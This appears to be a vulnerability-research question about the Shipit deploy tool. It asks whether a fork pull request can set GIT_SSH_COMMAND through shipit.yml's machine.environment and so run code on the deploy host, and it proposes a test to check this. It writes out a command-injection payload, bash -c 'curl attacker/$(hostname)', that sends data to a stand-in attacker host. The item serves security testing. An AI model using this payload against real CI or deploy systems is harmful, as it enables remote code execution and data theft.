# Q1978: Concrete `GIT_SSH_COMMAND=bash -c 'curl attacker/$(hostn` payload via a `machine.environment` entry in the fork branch's `shipit.yml`

## Question
Can an unprivileged fork PR set `GIT_SSH_COMMAND` to `bash -c 'curl attacker/$(hostname)'` through a `machine.environment` entry in the fork branch's `shipit.yml`, so the review-stack deploy process executes it because it replaces the ssh program git invokes with an arbitrary command during fetch/clone?

## Target
- File/function: app/models/shipit/review_stack.rb + lib/shipit/command.rb
- Entrypoint: Unprivileged PR -> ReviewStack -> PerformTaskJob -> PTY.spawn
- Attacker controls: `GIT_SSH_COMMAND=bash -c 'curl attacker/$(hostname)'` via a `machine.environment` entry in the fork branch's `shipit.yml`
- Exploit idea: `DeploySpec#machine_env` returns `config('machine','environment')` verbatim and `TaskCommands#env` merges it into the hash passed to `PTY.spawn`, and the fork PR author controls that file on the review-stack branch; the concrete value `bash -c 'curl attacker/$(hostname)'` replaces the ssh program git invokes with an arbitrary command during fetch/clone
- Invariant to test: No spawned deploy process ever sees a fork-controlled `GIT_SSH_COMMAND`.
- Expected Immunefi impact: Critical — Remote Code Execution on the Shipit deploy host (HackerOne/Immunefi RCE class)
- Fast validation: minitest: inject `GIT_SSH_COMMAND=bash -c 'curl attacker/$(hostname)'`, assert Command#unbundled_env carries it verbatim to PTY.spawn.
